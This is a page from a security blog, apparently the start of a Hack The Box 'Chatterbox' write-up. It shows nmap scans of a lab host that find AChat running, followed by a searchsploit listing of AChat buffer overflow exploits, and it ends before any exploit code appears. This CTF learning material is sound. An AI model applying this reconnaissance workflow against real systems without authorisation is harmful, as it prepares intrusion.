@@ -1,0 +1,1256 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="the notes record by hypnotic">
+      
+      
+        <meta name="author" content="hypnotic">
+      
+      
+        <link rel="canonical" href="https://hypnoticp.github.io/CTF/HTB/Windows-chatterbox/index.html">
+      
+      
+      
+      
+      <link rel="icon" href="../../../icons/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.42">
+    
+    
+      
+        <title>信息收集 - hypnotic的博客</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.0253249f.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:300,300i,400,400i,700,700i%7CUbuntu+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Ubuntu";--md-code-font:"Ubuntu Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="deep" data-md-color-accent="deep">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#_1" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../../index.html" title="hypnotic的博客" class="md-header__button md-logo" aria-label="hypnotic的博客" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            hypnotic的博客
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              信息收集
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="deep" data-md-color-accent="deep"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="deep" data-md-color-accent="deep"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/hypnoticp/hypnoticp.github.io.git" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    hypnoticp.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../index.html" class="md-tabs__link">
+        
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Code_audit/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Code_audit
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Vulnerability_analysis/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Vulnerability_analysis
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Tools/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Tools
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../index.html" class="md-tabs__link">
+          
+  
+    
+  
+  CTF
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../SRC/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  SRC
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Security_devices/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Security_devices
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Shell_Scripts/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Shell_Scripts
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../about.html" class="md-tabs__link">
+        
+  
+    
+  
+  About
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../index.html" title="hypnotic的博客" class="md-nav__button md-logo" aria-label="hypnotic的博客" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    hypnotic的博客
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/hypnoticp/hypnoticp.github.io.git" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    hypnoticp.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../index.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../Code_audit/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Code_audit
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../Vulnerability_analysis/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Vulnerability_analysis
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../Tools/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Tools
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    CTF
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../SRC/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    SRC
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../Security_devices/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Security_devices
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../Shell_Scripts/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Shell_Scripts
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../about.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    About
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+
+
+<h1 id="_1">信息收集<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<h2 id="nmap">Nmap<a class="headerlink" href="#nmap" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>root@kali# nmap -sT -p- --min-rate 5000 --max-retries 1 10.10.10.74
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>...
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>PORT     STATE SERVICE
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>9255/tcp open  mon
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>9256/tcp open  unknown
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>...
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>root@kali# nmap -sU -p- --min-rate 5000 --max-retries 1 10.10.10.74
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>...
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>All 65535 scanned ports on 10.10.10.74 are open|filtered
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>...
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>root@kali# nmap 10.10.10.74 -sV -T4 -A -O -p 9255,9256 
+<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>...
+<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>PORT     STATE SERVICE VERSION
+<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>9255/tcp open  http    AChat chat system httpd
+<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>|_http-title: Site doesn&#39;t have a title.
+<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>|_http-server-header: AChat
+<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>9256/tcp open  achat   AChat chat system
+<a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+<a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>Device type: general purpose|phone|specialized
+<a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
+<a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
+<a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)
+<a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>No exact OS matches for host (test conditions non-ideal).
+<a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>Network Distance: 2 hops
+<a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>
+<a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>TRACEROUTE (using port 9256/tcp)
+<a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a>HOP RTT       ADDRESS
+<a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a>1   249.48 ms 10.10.14.1
+<a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a>2   249.69 ms 10.10.10.74
+<a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>
+<a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a>Nmap done: 1 IP address (1 host up) scanned in 20.06 seconds
+<a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a>...
+</code></pre></div>
+<p>我们可以发现只有两个端口显示运行了一个叫AChat的软件。</p>
+<h1 id="_2">漏洞检测与利用<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
+<h2 id="kaliachat">kali搜索AChat 漏洞<a class="headerlink" href="#kaliachat" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>┌──(root㉿kali)-[/home/tom/桌面]
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>└─# searchsploit AChat             
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>---------------------------------------- ---------------------------------
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a> Exploit Title                          |  Path
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>---------------------------------------- ---------------------------------
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>Achat 0.150 beta7 - Remote Buffer Overf | windows/remote/36025.py
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>Achat 0.150 beta7 - Remote Buffer Overf | windows/remote/36056.rb
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>MataChat - &#39;input.php&#39; Multiple Cross-S | php/webapps/32958.txt
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>Parachat 5.5 - Directory Traversal      | php/webapps/24647.txt
+<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>---------------------------------------- ---------------------------------
